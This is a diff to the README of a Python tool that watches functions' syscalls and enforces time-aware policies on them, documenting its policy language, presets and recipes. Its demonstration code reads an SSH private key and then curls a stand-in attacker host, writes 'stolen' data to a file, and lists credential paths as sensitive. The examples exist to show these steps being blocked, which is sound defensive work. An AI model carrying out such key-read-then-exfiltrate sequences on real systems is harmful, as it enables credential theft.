@@ -41,62 +41,176 @@ strands-inspect --http --port 8000   # HTTP mode, multi-client
 
 ---
 
-## `@watch` — see everything
+## `@watch` — see everything, block what you don't want
 
 ```python
 from strands_inspect import watch
 
-@watch
-def fibonacci(n):
-    memo = {}
-    def fib(k):
-        if k <= 1: return k
-        if k not in memo: memo[k] = fib(k-1) + fib(k-2)
-        return memo[k]
-    return fib(n)
-
-result = fibonacci(80)
-```
-
-```
-🔍 InspectSession: fibonacci_20260302_060222
-   Function: __main__.fibonacci
-   Wall: 0.1ms | Peak mem: 8.0 KB
-   Return: 23416728348467685
-```
-
-Add a policy to block what you don't want:
-
-```python
-from strands_inspect import watch, PolicyViolation
-
 @watch(policy="sandbox")
 def suspicious_task():
     import json
-    data = json.dumps({"key": "value"})  # ← allowed
-
-    try:
-        open("/tmp/exfil.txt", "w").write("stolen data")  # ← blocked
-    except PolicyViolation as e:
-        print(f"CAUGHT: {e}")
-
-    try:
-        import subprocess
-        subprocess.run(["curl", "http://evil.com"])  # ← blocked
-    except PolicyViolation as e:
-        print(f"CAUGHT: {e}")
-
+    data = json.dumps({"key": "value"})            # ← allowed
+    open("/tmp/exfil.txt", "w").write("stolen")     # ← blocked: no permit covers file.write
     return data
 ```
 
+Presets are files: `"sandbox"` is [`strands_inspect/policies/sandbox.dw`](strands_inspect/policies/sandbox.dw).
+Policies are written in **[Dogwood](https://github.com/dogwood-policy/dogwood)** — Cedar syntax plus
+time — and the whole language runs in-process, pure Python, no dependencies:
+
+```python
+import subprocess
+from strands_inspect import watch
+
+@watch(policy="""
+permit(principal, action, resource);
+@id("no-exfil-after-secret")
+forbid(principal, action in [Inspect::Action::"net", Inspect::Action::"os"], resource)
+when temporal {
+    formerly within 5m Inspect::Action::"file.read"::request{ input.sensitive: true }
+};
+""")
+def agent():
+    open("/etc/hosts").read()                             # fine
+    subprocess.run(["uname", "-s"], capture_output=True)  # fine: nothing sensitive read yet
+    open("/home/me/.ssh/id_rsa").read()                   # a credential-shaped path
+    subprocess.run(["curl", "https://evil.example"])      # blocked
 ```
-🔍 InspectSession: suspicious_task_20260302_060244
-   Wall: 0.1ms | Peak mem: 7.0 KB
-   Return: '{"key": "value"}'
-   🚫 Denied: 2 syscalls blocked
-      - file.write: /tmp/exfil.txt (mode=w)
-      - subprocess: curl http://evil.com
+
 ```
+🔍 InspectSession: agent_20260930_154407
+   Function: __main__.agent
+   Wall: 8.0ms | Peak mem: 0.0 KB
+   ❌ Exception: 🚫 Policy denied: subprocess — curl https://evil.example (rule no-exfil-after-secret)
+   📋 Syscalls: 9 total
+      Files read: 2 | written: 0 | deleted: 0
+      Network: 0 | Subprocess: 3 | os.system: 0
+   🚫 Denied: 1 syscalls blocked
+      - subprocess: curl https://evil.example
+```
+
+Read a secret, and for the next five minutes the function cannot reach the network or spawn a
+process. The same `curl` was fine one line earlier. That is what a policy language with history
+buys you; a per-category allow/deny table cannot say it.
+
+## The policy language
+
+A rule is `permit` or `forbid`, a scope `(principal, action, resource)`, and `when` / `unless`
+conditions. **Forbid always wins; nothing matched means deny.** `principal` is the watched
+function (`Inspect::Function::"module.name"`), `resource` the process, `action` one of the 20
+hooked categories below. Conditions read `context.input.<field>`:
+
+| action | group | `context.input` fields (every action also has `detail`, `op`) |
+|---|---|---|
+| `file.read` `file.write` | `file` | `path`, `mode`, `sensitive: Bool` |
+| `file.delete` `file.mkdir` `file.special` | `file` | `path` |
+| `file.move` `file.link` | `file` | `src`, `dst` |
+| `file.chmod` | `file` | `path`, `mode` |
+| `file.fd_io` | `file` | `fd: Long`, `size: Long` |
+| `network` | `net` | `host`, `port: Long`, `url`, `scheme`, `method` |
+| `net.socket` | `net` | `host`, `port: Long`, `size: Long` |
+| `subprocess` `os.system` `os.exec` | `os` | `command`, `program`, `argv: Set<String>`, `shell: Bool` |
+| `process.fork` | `process` | — |
+| `process.kill` | `process` | `pid: Long`, `signal: Long` |
+| `process.mp` | `process` | `name`, `target` |
+| `import` | — | `module`, `package` |
+| `meta.ctypes` | `meta` | `library` |
+| `meta.code` | `meta` | `source` |
+
+`sensitive` is true under `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gcloud`, `~/.kube`, for
+`/etc/shadow`, `/etc/passwd`, and for basenames like `.env*`, `*.pem`, `*.key`, `id_*`,
+`*credentials*`, `*.keychain*`. `op` is the hooked callable (`open`, `shutil.copy`,
+`subprocess.Popen`, `requests.Session.request`, ...). `context.system` is `{ now, session }`.
+The full schema is [`strands_inspect/dogwood/inspect.cedarschema`](strands_inspect/dogwood/inspect.cedarschema).
+
+### Presets
+
+| preset | file | rules |
+|---|---|---|
+| `allow_all` | [allow_all.dw](strands_inspect/policies/allow_all.dw) | permit everything (the `@watch` default) |
+| `deny_network` | [deny_network.dw](strands_inspect/policies/deny_network.dw) | permit everything, forbid the `net` group |
+| `deny_write` | [deny_write.dw](strands_inspect/policies/deny_write.dw) | permit everything, forbid write / delete / move / chmod |
+| `sandbox` | [sandbox.dw](strands_inspect/policies/sandbox.dw) | permit `file.read` and `import` only |
+| `strict` | [strict.dw](strands_inspect/policies/strict.dw) | `@ask` before every read and import; deny the rest |
+| `deny_all` | [deny_all.dw](strands_inspect/policies/deny_all.dw) | forbid everything |
+
+A `permit` annotated `@ask` is granted only after a `y/N` prompt. Every rule carries an `@id`;
+the id appears in the `PolicyViolation`, in the session trace and in the viewer.
+
+### Recipes
+
+```
+// only HTTPS to OpenAI
+permit(principal, action == Inspect::Action::"network", resource)
+when { context.input.host like "*.openai.com" && context.input.port == 443 };
+
+// writes only under /tmp, never to a credential-shaped path
+permit(principal, action == Inspect::Action::"file.write", resource)
+when { context.input.path like "/tmp/*" && !context.input.sensitive };
+
+// no shell, and never curl
+permit(principal, action in [Inspect::Action::"os"], resource)
+when { context.input.shell == false && !context.input.argv.contains("curl") };
+
+// rate limit: at most 3 subprocesses per minute (count_within is in the default macro library)
+forbid(principal, action == Inspect::Action::"subprocess", resource)
+when temporal {
+    exists (n: Long). ((count_within(1m, Inspect::Action::"subprocess"::request{ input.op: "subprocess.Popen" })) == n && n > 3)
+};
+
+// no write after the network was touched
+forbid(principal, action == Inspect::Action::"file.write", resource)
+when temporal { formerly within 1h Inspect::Action::"network"::request{} };
+
+// a read of anything under /secrets, then no subprocess
+forbid(principal, action in [Inspect::Action::"os"], resource)
+when temporal { formerly within 10m Inspect::Action::"file.read"::request{ input.path: "/secrets/plan.txt" } };
+```
+
+Temporal operators: `formerly within W P` (happened in the window), `previous within W P` (the
+event just before), `!P since within W Q` (not since), `exists`, `count` / `sum`. History is
+per watched function. The reference guide is at [dogwood-policy.github.io](https://dogwood-policy.github.io/dogwood/).
+
+### `.dw` files and config
+
+```python
+@watch(policy="policies/team.dw")          # a path ending in .dw
+@watch(policy=DogwoodPolicy.from_file(p))  # or the object
+
+# .strands-inspect.toml
+# [watch.policies.readonly]
+# dogwood = 'permit(principal, action, resource); forbid(principal, action in [Inspect::Action::"file.write"], resource);'
+# [watch.policies.team]
+# file = "policies/team.dw"
+@watch(policy="readonly")
+```
+
+The legacy dict / callable form still works unchanged:
+`@watch(policy={"file.write": "deny", "network": {"action": "allow", "hosts": ["*.openai.com"]}})`.
+
+### Check, replay, explain
+
+```
+python -m strands_inspect.dogwood check   policy.dw
+python -m strands_inspect.dogwood explain policy.dw
+python -m strands_inspect.dogwood replay  policy.dw trace.log --schema schema.cedarschema
+```
+
+```
+# strands_inspect/policies/deny_network.dw: 2 rule(s)
+- permit allow-everything: 25 action(s) [file, net, os, process, meta, file.read, ...]
+- forbid deny-network: 3 action(s) [net, network, net.socket]
+# @lock projection: {'network': False, 'file_read': True, 'file_write': True, 'subprocess': True, 'ipc': True, 'mmap_exec': True, 'sysctl': False}
+```
+
+### Conformance
+
+The implementation (`strands_inspect/dogwood/`, stdlib only) is checked against the reference
+corpus of `dogwood@996d756`. Vendored in `tests/dogwood_corpus/`: **631/631 traces
+byte-identical** (160 temporal_only + 154 macros + 18 mixed cases, 38 docs examples). Against
+the full reference checkout: **temporal_only 1061/1061, macros 254/254, mixed 18/18, docs
+examples 38/38**; the 21 cases that call information providers are skipped — providers, template
+slots and Rhai are not supported, and a policy using them is rejected at parse time.
 
 ## `@lock` — nothing escapes
 
@@ -110,11 +224,6 @@ def try_network():
     import urllib.request
     urllib.request.urlopen("http://example.com")
     return "should not reach here"
-
-try:
-    result = try_network()
-except RuntimeError as e:
-    print(f"Blocked: {e}")
 ```
 
 ```
@@ -123,30 +232,11 @@ except RuntimeError as e:
    Exception: URLError: <urlopen error [Errno 8] nodename nor servname provided>
 ```
 
-## Granular policies
-
-```python
-@watch(policy={
-    "file.read": {"action": "allow", "paths": ["/tmp/**"]},
-    "file.write": "deny",
-    "network": {"action": "allow", "hosts": ["*.openai.com"]},
-    "subprocess": "deny",
-    "import": "log",
-})
-def guarded():
-    ...
-```
-
-| Preset | Does |
-|---|---|
-| `"allow_all"` | Log everything, block nothing |
-| `"deny_network"` | Block all network |
-| `"deny_write"` | Block file writes and deletes |
-| `"sandbox"` | Block writes, network, subprocess, exec |
-| `"strict"` | Block almost everything |
-| `"deny_all"` | Block everything |
-
-20 categories: `file.read` · `file.write` · `file.delete` · `file.move` · `file.chmod` · `file.link` · `file.mkdir` · `file.fd_io` · `file.special` · `network` · `net.socket` · `subprocess` · `os.system` · `os.exec` · `process.fork` · `process.kill` · `process.mp` · `import` · `meta.ctypes` · `meta.code`
+`@lock(policy=<Dogwood>)` **projects** the policy onto the seven kernel capabilities: a
+capability is allowed only if an unconditional `permit` covers all of its actions and no
+`forbid` touches them; `file.read ... when { context.input.path like "/data/*" }` becomes a
+read allow-list; `@ask` and temporal rules deny (the kernel has no prompt and no history).
+Kernel preset names (`sandbox`, `strict`, `deny_all`) keep their hand-written tables.
 
 ## Agent tool
 
@@ -158,45 +248,27 @@ agent = Agent(tools=[inspect_tool])
 agent("scan the requests library and find how to POST json")
 ```
 
-```
-📦 requests — Version: 2.32.3
-📊 12 modules, 184 callables
-
-  - post(url, data=None, json=None, **kwargs) — Sends a POST request
-  - get(url, params=None, **kwargs) — Sends a GET request
-  ...
-```
-
 16 actions: `scan` · `call` · `inspect` · `search` · `generate` · `exec` · `create` · `list` · `source` · `install` · `profile` · `graph` · `connections` · `hotspots` · `unused` · `deps`
 
-## Replay
+## Replay and viewer
 
-Every `@watch`'d call saves a `.dill` file:
+Every `@watch`'d call saves a `.dill` file; `session.to_json("run.json")` exports it for the
+web viewer (`docs/viewer.html`: memory timeline, syscall log, and the rule that decided each
+denied call — see [`docs/examples/dogwood_exfil.json`](docs/examples/dogwood_exfil.json)).
 
 ```python
 from strands_inspect import replay
-
-session = replay("fibonacci_20260302_060222.dill")
-session.re_run()        # same args
-session.re_run(100)     # different args
-```
-
-## Viewer
-
-Export JSON. Drop into the web viewer. Memory timeline, CPU flamegraph, syscall log.
-
-```python
-session.to_json("profile.json")
-# Open docs/index.html → viewer tab
+session = replay("agent_20260930_154407.dill")
+session.re_run()
 ```
 
 ## Three layers
 
 | Layer | What | Escapes |
 |---|---|---|
-| `@watch` | 55+ Python hooks | C extensions |
-| `@watch(policy=...)` | hooks + allow/deny | C extensions |
-| `@lock` | Kernel sandbox (forked subprocess) | Nothing |
+| `@watch` | 55+ Python hooks, every call recorded | C extensions |
+| `@watch(policy=...)` | hooks + a Dogwood policy (Cedar + time) | C extensions |
+| `@lock` | kernel sandbox (forked subprocess), Dogwood projected | Nothing |
 
 ## Install
 
@@ -204,6 +276,6 @@ session.to_json("profile.json")
 pip install strands-inspect
 ```
 
-Python 3.10+. One dependency: `strands-agents`. Everything else is stdlib.
+Python 3.10+. One dependency: `strands-agents`. The Dogwood engine is stdlib only.
 
-MIT License.
+MIT License. The vendored conformance corpus is Apache-2.0 (`tests/dogwood_corpus/LICENSE`).
